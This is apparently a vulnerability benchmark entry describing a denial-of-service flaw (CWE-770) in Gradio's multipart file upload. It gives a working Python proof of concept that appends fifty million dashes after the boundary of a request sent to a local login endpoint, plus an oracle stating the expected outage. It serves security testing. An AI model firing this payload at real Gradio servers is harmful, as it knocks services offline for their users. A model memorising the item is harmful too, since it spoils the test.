title: Denial of Service caused by excessive characters appended to multipart boundary in Gradio file upload
cwe: CWE-770: Allocation of Resources Without Limits or Throttling
trigger_payload:
import requests
# Configuration
num = 50000000
url = "http://127.0.0.1:7860/login"
headers = {
"Content-Type": "multipart/form-data; boundary=---------------------------28417809174060210578"
}
# The exact raw payload as specified
data = (
"-----------------------------284178091740602105783377960069\r\n"
"Content-Disposition: form-data; name=\"uploadFile\"; filename=\"test.txt\"\r\n"
"Content-Type: text/plain\r\n\r\n"
"Hello I am test\r\n"
"-----------------------------284178091740602105783377960069--" + '-' * num + "\r\n"
)
response = requests.post(url, headers=headers, data=data.encode('utf-8'), verify=False)
# Print response status code
print(response.status_code)
oracle: Gradio application becomes unavailable for extended periods due to excessive processing of characters appended to the multipart boundary
